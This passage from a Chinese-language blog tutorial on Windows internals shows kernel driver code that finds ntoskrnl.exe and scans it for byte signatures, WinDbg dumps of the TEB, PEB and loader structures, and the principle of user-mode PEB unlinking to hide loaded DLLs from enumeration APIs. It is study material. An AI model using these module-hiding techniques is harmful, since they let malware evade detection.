class="function"></span>&#123;</span><br><span class="line">	PLDR_DATA_TABLE_ENTRY pLDR_Head = <span class="literal">NULL</span>;</span><br><span class="line">	PLDR_DATA_TABLE_ENTRY pLDR_Tail = <span class="literal">NULL</span>;</span><br><span class="line">	UNICODE_STRING UnicodeMoudleName = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">	</span><br><span class="line">	RtlInitUnicodeString(&amp;UnicodeMoudleName,<span class="string">L&quot;ntoskrnl.exe&quot;</span>);</span><br><span class="line"></span><br><span class="line">	pLDR_Head = (PLDR_DATA_TABLE_ENTRY)pDriver-&gt;DriverSection;</span><br><span class="line">	pLDR_Tail = pLDR_Head;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">do</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span>(RtlCompareUnicodeString(&amp;pLDR_Tail-&gt;BaseDllName, &amp;UnicodeMoudleName, TRUE) == <span class="number">0</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			*DllBase = pLDR_Tail-&gt;DllBase;</span><br><span class="line">			*SizeOfImage = pLDR_Tail-&gt;SizeOfImage;</span><br><span class="line">			<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="comment">//pLDR_Blink = (PLDR_DATA_TABLE_ENTRY)CONTAINING_RECORD(pLDR_Flink,LDR_DATA_TABLE_ENTRY,InLoadOrderLinks);</span></span><br><span class="line">		pLDR_Tail = (PLDR_DATA_TABLE_ENTRY)pLDR_Tail-&gt;InLoadOrderLinks.Flink;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">while</span>(pLDR_Head != pLDR_Tail);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">PVOID <span class="title">Find_FeatureCode</span><span class="params">(PVOID pShellCode,ULONG ulShellCode_Len,PVOID DllBase,ULONG ulSizeOfImage)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	ULONG ulDllLastByte = <span class="number">0</span>;</span><br><span class="line">	PVOID pNextByte = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">	pNextByte = DllBase;</span><br><span class="line">	ulDllLastByte = (ULONG)DllBase + ulSizeOfImage;</span><br><span class="line">	<span class="keyword">while</span>((ULONG)pNextByte + ulShellCode_Len &lt;= ulDllLastByte)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span>(RtlCompareMemory(pNextByte,pShellCode,ulShellCode_Len) == ulShellCode_Len)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">return</span> (PVOID)((ULONG)pNextByte - <span class="number">6</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		pNextByte = (PVOID)((ULONG)pNextByte + <span class="number">1</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img data-src="https://s2.loli.net/2022/01/16/Qy9u7DbM6IaWSNc.png" alt="17.png"></p>
<p><img data-src="https://s2.loli.net/2022/01/16/X31Hsk95gCy7Qb8.png" alt="18.png"></p>
<h2 id="3-3环PEB断链"><a href="#3-3环PEB断链" class="headerlink" title="3 3环PEB断链"></a>3 3环PEB断链</h2><p>TEB：线程环境块，每个线程都有这么一块内存存储信息来描述当前线程的信息，<mark class="label warning">fs:[0]</mark>指向TEB。</p>
<p>PEB：进程环境块，TEB偏移0x30就是PEB，即<mark class="label success">fs:[0x30]</mark>。</p>
<p>PEB、TEB是3环的，都是3环的内存，在3环就可读取。<strong>FS段寄存器在3环和0环的含义不一样</strong>。</p>
<div class="note primary"><p><strong>fs:[0]：</strong>TEB --&gt; <strong>fs:[0x30]：</strong>PEB  --&gt; <strong>PEB+0xC</strong>：PEB_LDR_DATA --&gt; <strong>PEB_LDR_DATA+0xC</strong>：LDR_DATA_TABLE_ENTRY</p>
</div>

<p>示意图如下：具体可以参考：《<a href="https://www.cnblogs.com/bokernb/p/6404795.html">PEB及LDR链</a><a href="https://www.cnblogs.com/bokernb/p/6404795.html">PEB及LDR链</a>》</p>
<p><img data-src="https://s2.loli.net/2022/01/20/JKsiP5R6Qz8nM1t.png" alt="19.png"></p>
<p><img data-src="https://s2.loli.net/2022/01/17/wBxzcRrdjIWhe9l.jpg" alt="20.jpeg"></p>
<p>⚠️<strong>注意</strong>：这里的<code>LDR_DATA_TABLE_ENTRY</code>是3环的，在3环通过该结构只能够列举该进程在3环加载的所有模块。</p>
<h3 id="3-1-TEB、PEB"><a href="#3-1-TEB、PEB" class="headerlink" title="3.1 TEB、PEB"></a>3.1 TEB、PEB</h3><p><strong>一、TEB</strong></p>
<p>段寄存器FS（<mark class="label primary">fs:[0]</mark>）<strong>存的值指向TEB结构</strong>，在OD中可以看到3环下FS的值（<code>0x7FFDF000</code>）和对应的段选择子（<code>0x3B</code>）。</p>
<p>查看当前进程：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">kd&gt; !process <span class="number">0</span> <span class="number">0</span></span><br><span class="line">**** NT ACTIVE PROCESS DUMP ****</span><br><span class="line">  PROCESS <span class="number">861969f</span>8  SessionId: <span class="number">0</span>  Cid: <span class="number">0924</span>    Peb: <span class="number">7f</span>fd9000  ParentCid: <span class="number">0688</span></span><br><span class="line">    DirBase: <span class="number">06e401</span>c0  ObjectTable: e1e919e8  HandleCount:  <span class="number">74.</span></span><br><span class="line">    Image: ollydbg.exe</span><br><span class="line"></span><br><span class="line">PROCESS <span class="number">861e1020</span>  SessionId: <span class="number">0</span>  Cid: <span class="number">0970</span>    Peb: <span class="number">7f</span>fda000  ParentCid: <span class="number">0b</span>54</span><br><span class="line">    DirBase: <span class="number">06e40320</span>  ObjectTable: e1473788  HandleCount:  <span class="number">12.</span></span><br><span class="line">    Image: <span class="number">0119</span>_PEB.exe</span><br></pre></td></tr></table></figure>

<p>切换到当前进程空间：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">kd&gt; .process <span class="number">861e1020</span></span><br><span class="line">Implicit process is now <span class="number">861e1020</span></span><br><span class="line">WARNING: .cache forcedecodeuser is <span class="keyword">not</span> enabled</span><br></pre></td></tr></table></figure>

<p>TEB结构为：</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">kd&gt; dt _TEB <span class="number">0x7FFDF000</span></span><br><span class="line">nt!_TEB</span><br><span class="line">   +<span class="number">0x000</span> NtTib            : _NT_TIB</span><br><span class="line">   +<span class="number">0x01c</span> EnvironmentPointer : (null) </span><br><span class="line">   +<span class="number">0x020</span> ClientId         : _CLIENT_ID</span><br><span class="line">   +<span class="number">0x028</span> ActiveRpcHandle  : (null) </span><br><span class="line">   +<span class="number">0x02c</span> ThreadLocalStoragePointer : (null) </span><br><span class="line">   +<span class="number">0x030</span> ProcessEnvironmentBlock : <span class="number">0x7ffdd000</span> _PEB</span><br><span class="line">   +<span class="number">0x034</span> LastErrorValue   : <span class="number">0</span></span><br><span class="line">   +<span class="number">0x038</span> CountOfOwnedCriticalSections : <span class="number">0</span></span><br><span class="line">   +<span class="number">0x03c</span> CsrClientThread  : (null) </span><br><span class="line">   +<span class="number">0x040</span> Win32ThreadInfo  : (null) </span><br><span class="line">   +<span class="number">0x044</span> User32Reserved   : [<span class="number">26</span>] <span class="number">0</span></span><br><span class="line">   +<span class="number">0x0ac</span> UserReserved     : [<span class="number">5</span>] <span class="number">0</span></span><br><span class="line">   +<span class="number">0x0c0</span> WOW32Reserved    : (null) </span><br><span class="line">   +<span class="number">0x0c4</span> CurrentLocale    : <span class="number">0x804</span></span><br><span class="line">   +<span class="number">0x0c8</span> FpSoftwareStatusRegister : <span class="number">0</span></span><br><span class="line">   +<span class="number">0x0cc</span> SystemReserved1  : [<span class="number">54</span>] (null) </span><br><span class="line">   +<span class="number">0x1a4</span> ExceptionCode    : <span class="number">0</span>n0</span><br><span class="line">   +<span class="number">0x1a8</span> ActivationContextStack : _ACTIVATION_CONTEXT_STACK</span><br><span class="line">   +<span class="number">0x1bc</span> SpareBytes1      : [<span class="number">24</span>]  <span class="string">&quot;&quot;</span></span><br><span class="line">   +<span class="number">0x1d4</span> GdiTebBatch      : _GDI_TEB_BATCH</span><br><span class="line">   +<span class="number">0x6b4</span> RealClientId     : _CLIENT_ID</span><br><span class="line">   +<span class="number">0x6bc</span> GdiCachedProcessHandle : (null) </span><br><span class="line">   +<span class="number">0x6c0</span> GdiClientPID     : <span class="number">0</span></span><br><span class="line">   +<span class="number">0x6c4</span> GdiClientTID     : <span class="number">0</span></span><br><span class="line">   +<span class="number">0x6c8</span> GdiThreadLocalInfo : (null) </span><br><span class="line">   +<span class="number">0x6cc</span> Win32ClientInfo  : [<span class="number">62</span>] <span class="number">0</span></span><br><span class="line">   +<span class="number">0x7c4</span> glDispatchTable  : [<span class="number">233</span>] (null) </span><br><span class="line">   +<span class="number">0xb68</span> glReserved1      : [<span class="number">29</span>] <span class="number">0</span></span><br><span class="line">   +<span class="number">0xbdc</span> glReserved2      : (null) </span><br><span class="line">   +<span class="number">0xbe0</span> glSectionInfo    : (null) </span><br><span class="line">   +<span class="number">0xbe4</span> glSection        : (null) </span><br><span class="line">   +<span class="number">0xbe8</span> glTable          : (null) </span><br><span class="line">   +<span class="number">0xbec</span> glCurrentRC      : (null) </span><br><span class="line">   +<span class="number">0xbf0</span> glContext        : (null) </span><br><span class="line">   +<span class="number">0xbf4</span> LastStatusValue  : <span class="number">0</span></span><br><span class="line">   +<span class="number">0xbf8</span> StaticUnicodeString : _UNICODE_STRING <span class="string">&quot;kernel32.dll&quot;</span></span><br><span class="line">   +<span class="number">0xc00</span> StaticUnicodeBuffer : [<span class="number">261</span>] <span class="number">0x6b</span></span><br><span class="line">   +<span class="number">0xe0c</span> DeallocationStack : <span class="number">0x00030000</span> Void</span><br><span class="line">   +<span class="number">0xe10</span> TlsSlots         : [<span class="number">64</span>] (null) </span><br><span class="line">   +<span class="number">0xf10</span> TlsLinks         : _LIST_ENTRY [ <span class="number">0x0</span> - <span class="number">0x0</span> ]</span><br><span class="line">   +<span class="number">0xf18</span> Vdm              : (null) </span><br><span class="line">   +<span class="number">0xf1c</span> ReservedForNtRpc : (null) </span><br><span class="line">   +<span class="number">0xf20</span> DbgSsReserved    : [<span class="number">2</span>] (null) </span><br><span class="line">   +<span class="number">0xf28</span> HardErrorsAreDisabled : <span class="number">0</span></span><br><span class="line">   +<span class="number">0xf2c</span> Instrumentation  : [<span class="number">16</span>] (null) </span><br><span class="line">   +<span class="number">0xf6c</span> WinSockData      : (null) </span><br><span class="line">   +<span class="number">0xf70</span> GdiBatchCount    : <span class="number">0</span></span><br><span class="line">   +<span class="number">0xf74</span> InDbgPrint       : <span class="number">0</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line">   +0xf75 FreeStackOnTermination : 0 &#x27;&#x27;</span><br><span class="line">   +<span class="number">0xf76</span> HasFiberData     : <span class="number">0</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line">   +0xf77 IdealProcessor   : 0 &#x27;&#x27;</span><br><span class="line">   +<span class="number">0xf78</span> Spare3           : <span class="number">0</span></span><br><span class="line">   +<span class="number">0xf7c</span> ReservedForPerf  : (null) </span><br><span class="line">   +<span class="number">0xf80</span> ReservedForOle   : (null) </span><br><span class="line">   +<span class="number">0xf84</span> WaitingOnLoaderLock : <span class="number">0</span></span><br><span class="line">   +<span class="number">0xf88</span> Wx86Thread       : _Wx86ThreadState</span><br><span class="line">   +<span class="number">0xf94</span> TlsExpansionSlots : (null) </span><br><span class="line">   +<span class="number">0xf98</span> ImpersonationLocale : <span class="number">0</span></span><br><span class="line">   +<span class="number">0xf9c</span> IsImpersonating  : <span class="number">0</span></span><br><span class="line">   +<span class="number">0xfa0</span> NlsCache         : (null) </span><br><span class="line">   +<span class="number">0xfa4</span> pShimData        : (null) </span><br><span class="line">   +<span class="number">0xfa8</span> HeapVirtualAffinity : <span class="number">0</span></span><br><span class="line">   +<span class="number">0xfac</span> CurrentTransactionHandle : (null) </span><br><span class="line">   +<span class="number">0xfb0</span> ActiveFrame      : (null) </span><br><span class="line">   +<span class="number">0xfb4</span> SafeThunkCall    : <span class="number">0</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line">   +0xfb5 BooleanSpare     : [3]  &quot;&quot;</span><br></pre></td></tr></table></figure>

<p><strong>二、PEB结构</strong></p>
<p>由TEB结构可以看到偏移<code>0x30</code>处即指向PEB（<mark class="label danger">fs:[0x30]</mark>），即为<code>0x7ffdd000</code>。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">kd&gt; dt _PEB <span class="number">0x7ffdd000</span></span><br><span class="line">nt!_PEB</span><br><span class="line">   +<span class="number">0x000</span> InheritedAddressSpace : <span class="number">0</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line">   +0x001 ReadImageFileExecOptions : 0 &#x27;&#x27;</span><br><span class="line">   +<span class="number">0x002</span> BeingDebugged    : <span class="number">0x1</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line">   +0x003 SpareBool        : 0 &#x27;&#x27;</span><br><span class="line">   +<span class="number">0x004</span> Mutant           : <span class="number">0xffffffff</span> Void</span><br><span class="line">   +<span class="number">0x008</span> ImageBaseAddress : <span class="number">0x00400000</span> Void</span><br><span class="line">   +<span class="number">0x00c</span> Ldr              : <span class="number">0x00241ea0</span> _PEB_LDR_DATA</span><br><span class="line">   +<span class="number">0x010</span> ProcessParameters : <span class="number">0x00020000</span> _RTL_USER_PROCESS_PARAMETERS</span><br><span class="line">   +<span class="number">0x014</span> SubSystemData    : (null) </span><br><span class="line">   +<span class="number">0x018</span> ProcessHeap      : <span class="number">0x00140000</span> Void</span><br><span class="line">   +<span class="number">0x01c</span> FastPebLock      : <span class="number">0x7c99d600</span> _RTL_CRITICAL_SECTION</span><br><span class="line">   +<span class="number">0x020</span> FastPebLockRoutine : <span class="number">0x7c921000</span> Void</span><br><span class="line">   +<span class="number">0x024</span> FastPebUnlockRoutine : <span class="number">0x7c9210e0</span> Void</span><br><span class="line">   +<span class="number">0x028</span> EnvironmentUpdateCount : <span class="number">1</span></span><br><span class="line">   +<span class="number">0x02c</span> KernelCallbackTable : (null) </span><br><span class="line">   +<span class="number">0x030</span> SystemReserved   : [<span class="number">1</span>] <span class="number">0</span></span><br><span class="line">   +<span class="number">0x034</span> AtlThunkSListPtr32 : <span class="number">0</span></span><br><span class="line">   +<span class="number">0x038</span> FreeList         : (null) </span><br><span class="line">   +<span class="number">0x03c</span> TlsExpansionCounter : <span class="number">0</span></span><br><span class="line">   +<span class="number">0x040</span> TlsBitmap        : <span class="number">0x7c99d5c0</span> Void</span><br><span class="line">   +<span class="number">0x044</span> TlsBitmapBits    : [<span class="number">2</span>] <span class="number">1</span></span><br><span class="line">   +<span class="number">0x04c</span> ReadOnlySharedMemoryBase : <span class="number">0x7f6f0000</span> Void</span><br><span class="line">   +<span class="number">0x050</span> ReadOnlySharedMemoryHeap : <span class="number">0x7f6f0000</span> Void</span><br><span class="line">   +<span class="number">0x054</span> ReadOnlyStaticServerData : <span class="number">0x7f6f0688</span>  -&gt; (null) </span><br><span class="line">   +<span class="number">0x058</span> AnsiCodePageData : <span class="number">0x7ffa0000</span> Void</span><br><span class="line">   +<span class="number">0x05c</span> OemCodePageData  : <span class="number">0x7ffa0000</span> Void</span><br><span class="line">   +<span class="number">0x060</span> UnicodeCaseTableData : <span class="number">0x7ffd1000</span> Void</span><br><span class="line">   +<span class="number">0x064</span> NumberOfProcessors : <span class="number">1</span></span><br><span class="line">   +<span class="number">0x068</span> NtGlobalFlag     : <span class="number">0x70</span></span><br><span class="line">   +<span class="number">0x070</span> CriticalSectionTimeout : _LARGE_INTEGER <span class="number">0xffffe86d</span>`<span class="number">079b</span>8000</span><br><span class="line">   +<span class="number">0x078</span> HeapSegmentReserve : <span class="number">0x100000</span></span><br><span class="line">   +<span class="number">0x07c</span> HeapSegmentCommit : <span class="number">0x2000</span></span><br><span class="line">   +<span class="number">0x080</span> HeapDeCommitTotalFreeThreshold : <span class="number">0x10000</span></span><br><span class="line">   +<span class="number">0x084</span> HeapDeCommitFreeBlockThreshold : <span class="number">0x1000</span></span><br><span class="line">   +<span class="number">0x088</span> NumberOfHeaps    : <span class="number">4</span></span><br><span class="line">   +<span class="number">0x08c</span> MaximumNumberOfHeaps : <span class="number">0x10</span></span><br><span class="line">   +<span class="number">0x090</span> ProcessHeaps     : <span class="number">0x7c99cfc0</span>  -&gt; <span class="number">0x00140000</span> Void</span><br><span class="line">   +<span class="number">0x094</span> GdiSharedHandleTable : (null) </span><br><span class="line">   +<span class="number">0x098</span> ProcessStarterHelper : (null) </span><br><span class="line">   +<span class="number">0x09c</span> GdiDCAttributeList : <span class="number">0</span></span><br><span class="line">   +<span class="number">0x0a0</span> LoaderLock       : <span class="number">0x7c99b178</span> Void</span><br><span class="line">   +<span class="number">0x0a4</span> OSMajorVersion   : <span class="number">5</span></span><br><span class="line">   +<span class="number">0x0a8</span> OSMinorVersion   : <span class="number">1</span></span><br><span class="line">   +<span class="number">0x0ac</span> OSBuildNumber    : <span class="number">0xa28</span></span><br><span class="line">   +<span class="number">0x0ae</span> OSCSDVersion     : <span class="number">0x300</span></span><br><span class="line">   +<span class="number">0x0b0</span> OSPlatformId     : <span class="number">2</span></span><br><span class="line">   +<span class="number">0x0b4</span> ImageSubsystem   : <span class="number">3</span></span><br><span class="line">   +<span class="number">0x0b8</span> ImageSubsystemMajorVersion : <span class="number">4</span></span><br><span class="line">   +<span class="number">0x0bc</span> ImageSubsystemMinorVersion : <span class="number">0</span></span><br><span class="line">   +<span class="number">0x0c0</span> ImageProcessAffinityMask : <span class="number">0</span></span><br><span class="line">   +<span class="number">0x0c4</span> GdiHandleBuffer  : [<span class="number">34</span>] <span class="number">0</span></span><br><span class="line">   +<span class="number">0x14c</span> PostProcessInitRoutine : (null) </span><br><span class="line">   +<span class="number">0x150</span> TlsExpansionBitmap : <span class="number">0x7c99d5b8</span> Void</span><br><span class="line">   +<span class="number">0x154</span> TlsExpansionBitmapBits : [<span class="number">32</span>] <span class="number">0</span></span><br><span class="line">   +<span class="number">0x1d4</span> SessionId        : <span class="number">0</span></span><br><span class="line">   +<span class="number">0x1d8</span> AppCompatFlags   : _ULARGE_INTEGER <span class="number">0x0</span></span><br><span class="line">   +<span class="number">0x1e0</span> AppCompatFlagsUser : _ULARGE_INTEGER <span class="number">0x0</span></span><br><span class="line">   +<span class="number">0x1e8</span> pShimData        : (null) </span><br><span class="line">   +<span class="number">0x1ec</span> AppCompatInfo    : (null) </span><br><span class="line">   +<span class="number">0x1f0</span> CSDVersion       : _UNICODE_STRING <span class="string">&quot;Service Pack 3&quot;</span></span><br><span class="line">   +<span class="number">0x1f8</span> ActivationContextData : (null) </span><br><span class="line">   +<span class="number">0x1fc</span> ProcessAssemblyStorageMap : (null) </span><br><span class="line">   +<span class="number">0x200</span> SystemDefaultActivationContextData : <span class="number">0x00130000</span> Void</span><br><span class="line">   +<span class="number">0x204</span> SystemAssemblyStorageMap : (null) </span><br><span class="line">   +<span class="number">0x208</span> MinimumStackCommit : <span class="number">0</span></span><br></pre></td></tr></table></figure>

<p><strong>三、PEB_LDR_DATA结构</strong>，该结构的<code>LIST_ENTRY</code>即为模块。</p>
<div class="note info"><ul>
<li>PEB_LDR_DATA结构：<mark class="label danger">该结构的<code>LIST_ENTRY</code>即为模块</mark>。</li>
<li>_LDR_DATA_TABLE_ENTRY结构：<mark class="label default">该结构为模块的详细信息</mark>。</li>
</ul>
</div>

<p>在PEB偏移<code>0xC</code>得位置指向LDR链，LDR结构为：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">PEB_LDR_DATA</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    +<span class="number">0x00</span>	ULONG Length;</span><br><span class="line">    +<span class="number">0x04</span>	BOOLEAN Initialized;</span><br><span class="line">    +<span class="number">0x08</span>	PVOID SsHandle;</span><br><span class="line">    +<span class="number">0x0c</span>	LIST_ENTRY InLoadOrderModuleList;</span><br><span class="line">    +<span class="number">0x14</span>	LIST_ENTRY InMemoryOrderModuleList;</span><br><span class="line">    +<span class="number">0x1c</span>	LIST_ENTRY InInitializationOrderModuleList;</span><br><span class="line">    +<span class="number">0x24</span>	PVOID EntryInProgress; </span><br><span class="line">&#125; PEB_LDR_DATA,*PPEB_LDR_DATA; </span><br></pre></td></tr></table></figure>

<p>其中<code>InLoadOrderModuleList</code>、<code>InMemoryOrderModuleList</code>、<code>InInitializationOrderModuleList</code>为三个双向链表结构：</p>
<ul>
<li><code>InLoadOrderModuleList</code>： 模块加载顺序</li>
<li><code>InMemoryOrderModuleList</code> ：加载后在内存中的顺序</li>
<li><code>InInitializationOrderModuleList</code> ：模块初始化的顺序</li>
</ul>
<p>指向的结构为：**_LDR_DATA_TABLE_ENTRY**，该结构为模块的详细信息。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">LDR_DATA_TABLE_ENTRY</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">     LIST_ENTRY InLoadOrderLinks;</span><br><span class="line">     LIST_ENTRY InMemoryOrderLinks;</span><br><span class="line">     LIST_ENTRY InInitializationOrderLinks;</span><br><span class="line">     PVOID DllBase;</span><br><span class="line">     PVOID EntryPoint;</span><br><span class="line">     ULONG SizeOfImage;</span><br><span class="line">     UNICODE_STRING FullDllName;</span><br><span class="line">     UNICODE_STRING BaseDllName;</span><br><span class="line">     ULONG Flags;</span><br><span class="line">     WORD LoadCount;</span><br><span class="line">     WORD TlsIndex;</span><br><span class="line">     <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">     &#123;</span></span><br><span class="line">          LIST_ENTRY HashLinks;</span><br><span class="line">          <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">          &#123;</span></span><br><span class="line">               PVOID SectionPointer;</span><br><span class="line">               ULONG CheckSum;</span><br><span class="line">          &#125;;</span><br><span class="line">     &#125;;</span><br><span class="line">     <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">     &#123;</span></span><br><span class="line">          ULONG TimeDateStamp;</span><br><span class="line">          PVOID LoadedImports;</span><br><span class="line">     &#125;;</span><br><span class="line">     _ACTIVATION_CONTEXT * EntryPointActivationContext;</span><br><span class="line">     PVOID PatchInformation;</span><br><span class="line">     LIST_ENTRY ForwarderLinks;</span><br><span class="line">     LIST_ENTRY ServiceTagLinks;</span><br><span class="line">     LIST_ENTRY StaticLinks;</span><br><span class="line">&#125; LDR_DATA_TABLE_ENTRY, *PLDR_DATA_TABLE_ENTRY;</span><br></pre></td></tr></table></figure>

<ul>
<li>在3环：使用了<code>InLoadOrderLinks</code>，使用<code>InMemoryOrderModuleList</code>、<code>InInitializationOrderModuleList</code>这三个链表。</li>
<li>在0环：<code>_LDR_DATA_TABLE_ENTRY</code>中只使用了<code>InLoadOrderLinks</code>，并没有使用<code>InMemoryOrderModuleList</code>、<code>InInitializationOrderModuleList</code>这两个链表。</li>
</ul>
<p>使用如下方法查看：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">kd&gt; dt _PEB_LDR_DATA <span class="number">0x00241ea0</span></span><br><span class="line">nt!_PEB_LDR_DATA</span><br><span class="line">   +<span class="number">0x000</span> Length           : <span class="number">0x28</span></span><br><span class="line">   +<span class="number">0x004</span> Initialized      : <span class="number">0x1</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line">   +0x008 SsHandle         : (null) </span><br><span class="line">   +<span class="number">0x00c</span> InLoadOrderModuleList : _LIST_ENTRY [ <span class="number">0x241ee0</span> - <span class="number">0x242010</span> ]</span><br><span class="line">   +<span class="number">0x014</span> InMemoryOrderModuleList : _LIST_ENTRY [ <span class="number">0x241ee8</span> - <span class="number">0x242018</span> ]</span><br><span class="line">   +<span class="number">0x01c</span> InInitializationOrderModuleList : _LIST_ENTRY [ <span class="number">0x241f58</span> - <span class="number">0x242020</span> ]</span><br><span class="line">   +<span class="number">0x024</span> EntryInProgress  : (null) </span><br></pre></td></tr></table></figure>

<p><code>[ 0x241ee0 - 0x242010 ]</code>分别为：Flink（当前模块）与Blink（上一个模块）。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">kd&gt; dt _LDR_DATA_TABLE_ENTRY <span class="number">0x241ee0</span> </span><br><span class="line">nt!_LDR_DATA_TABLE_ENTRY</span><br><span class="line">   +<span class="number">0x000</span> InLoadOrderLinks : _LIST_ENTRY [ <span class="number">0x241f48</span> - <span class="number">0x241eac</span> ]</span><br><span class="line">   +<span class="number">0x008</span> InMemoryOrderLinks : _LIST_ENTRY [ <span class="number">0x241f50</span> - <span class="number">0x241eb4</span> ]</span><br><span class="line">   +<span class="number">0x010</span> InInitializationOrderLinks : _LIST_ENTRY [ <span class="number">0x0</span> - <span class="number">0x0</span> ]</span><br><span class="line">   +<span class="number">0x018</span> DllBase          : <span class="number">0x00400000</span> Void</span><br><span class="line">   +<span class="number">0x01c</span> EntryPoint       : <span class="number">0x00401190</span> Void</span><br><span class="line">   +<span class="number">0x020</span> SizeOfImage      : <span class="number">0x2c000</span></span><br><span class="line">   +<span class="number">0x024</span> FullDllName      : _UNICODE_STRING <span class="string">&quot;C:\Documents and Settings\A1v1n\桌面\VC6\Microsoft Visual Studio\MyProjects\0119_PEB\Debug\0119_PEB.exe&quot;</span></span><br><span class="line">   +<span class="number">0x02c</span> BaseDllName      : _UNICODE_STRING <span class="string">&quot;0119_PEB.exe&quot;</span></span><br><span class="line">   +<span class="number">0x034</span> Flags            : <span class="number">0x5000</span></span><br><span class="line">   +<span class="number">0x038</span> LoadCount        : <span class="number">0xffff</span></span><br><span class="line">   +<span class="number">0x03a</span> TlsIndex         : <span class="number">0</span></span><br><span class="line">   +<span class="number">0x03c</span> HashLinks        : _LIST_ENTRY [ <span class="number">0x7c99b2d8</span> - <span class="number">0x7c99b2d8</span> ]</span><br><span class="line">   +<span class="number">0x03c</span> SectionPointer   : <span class="number">0x7c99b2d8</span> Void</span><br><span class="line">   +<span class="number">0x040</span> CheckSum         : <span class="number">0x7c99b2d8</span></span><br><span class="line">   +<span class="number">0x044</span> TimeDateStamp    : <span class="number">0x61e7f524</span></span><br><span class="line">   +<span class="number">0x044</span> LoadedImports    : <span class="number">0x61e7f524</span> Void</span><br><span class="line">   +<span class="number">0x048</span> EntryPointActivationContext : (null) </span><br><span class="line">   +<span class="number">0x04c</span> PatchInformation : (null) </span><br></pre></td></tr></table></figure>



<p>有大佬总结在Win XP和Win7下，<code>InLoadOrderModuleList</code>指向的模块按照顺序：第一个是EXE模块本身，第二个是NTDLL.DLL，第三个是KERNEL32.DLL。这样，KERNEL32.DLL的顺序是不是又固定了呢？实际上这样也并非能在任何场景下通用，还是老老实实拿着模块名称来遍历查询的ShellCode才通用。（可参考：<a href="https://www.cnblogs.com/bokernb/p/6404795.html">PEB及LDR链</a>最后一段。）</p>
<p><img data-src="https://s2.loli.net/2022/01/19/HSEWsYBdh7bpizI.png" alt="25.png"></p>
<p>图片来源：<a href="https://www.cnblogs.com/thresh/p/12609659.html">Window中的shellcode编写框架（入门篇）</a></p>
<h3 id="3-2-断链原理"><a href="#3-2-断链原理" class="headerlink" title="3.2 断链原理"></a>3.2 断链原理</h3><p>模块断链只是隐藏起来不让API查到，但是正常的功能不受影响。</p>
<p>3环下PEB断链是一种常见的模块隐藏技术，原理是修改<code>_PEB_LDR_DATA</code>中的三个双向链表，删除链表中的项，让 <code>CreateToolhelp32Snapshot</code>之类的API无法通过模块列表枚举DLL。</p>
<p>结构如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">PEB_LDR_DATA</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">　+<span class="number">0x00</span>	ULONG Length;</span><br><span class="line">　+<span class="number">0x04</span>	BOOLEAN Initialized; </span><br><span class="line">　+<span class="number">0x08</span>	PVOID SsHandle;</span><br><span class="line">　+<span class="number">0x0c</span>	LIST_ENTRY InLoadOrderModuleList;</span><br><span class="line">　+<span class="number">0x14</span>	LIST_ENTRY InMemoryOrderModuleList;</span><br><span class="line">　+<span class="number">0x1c</span>	LIST_ENTRY InInitializationOrderModuleList;</span><br><span class="line">  +<span class="number">0x24</span>	PVOID EntryInProgress;</span><br><span class="line">&#125; PEB_LDR_DATA,*PPEB_LDR_DATA; </span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">LIST_ENTRY</span> &#123;</span></span><br><span class="line">   <span class="class"><span class="keyword">struct</span> _<span class="title">LIST_ENTRY</span> *<span class="title">Flink</span>;</span></span><br><span class="line">   <span class="class"><span class="keyword">struct</span> _<span class="title">LIST_ENTRY</span> *<span class="title">Blink</span>;</span></span><br><span class="line">&#125; LIST_ENTRY, *PLIST_ENTRY, *RESTRICTED_POINTER PRLIST_ENTRY;</span><br></pre></td></tr></table></figure>

<p>需要注意的三个结构：</p>
<ul>
<li>InLoadOrderModuleList ：描述<strong>当前进程中</strong>模块的加载顺序</li>
<li>InMemoryOrderModuleList：所有模块在内存中的顺序</li>
<li>InInitializationOrderModuleList ：所有模块初始化的顺序</li>
</ul>
